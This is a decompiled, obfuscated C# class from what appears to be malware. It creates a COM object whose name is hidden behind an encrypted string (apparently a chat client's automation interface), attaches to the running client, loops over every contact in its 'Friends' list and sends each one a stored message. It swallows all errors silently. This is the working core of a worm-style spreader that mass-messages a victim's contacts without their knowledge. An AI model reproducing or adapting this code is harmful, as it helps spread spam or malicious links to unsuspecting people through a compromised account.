using System;
using System.Collections;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns3;
using ns4;

namespace ns2;

internal class Class35
{
	public class Class36
	{
		public static void smethod_0()
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class6.smethod_0("qbzV07pqlKuwg6m81dO6EA==", "False"), ""));
				NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(objectValue, (Type)null, "Attach", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((IEnumerable)NewLateBinding.LateGet(objectValue, (Type)null, "Friends", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
						object[] array = new object[2];
						object obj = objectValue2;
						array[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Handle", new object[0], (string[])null, (Type[])null, (bool[])null));
						array[1] = Class5.string_61;
						object[] array2 = array;
						bool[] array3 = new bool[2] { true, true };
						NewLateBinding.LateCall(objectValue, (Type)null, "SendMessage", array2, (string[])null, (Type[])null, array3, true);
						if (array3[0])
						{
							NewLateBinding.LateSetComplex(obj, (Type)null, "Handle", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
						}
						if (array3[1])
						{
							Class5.string_61 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
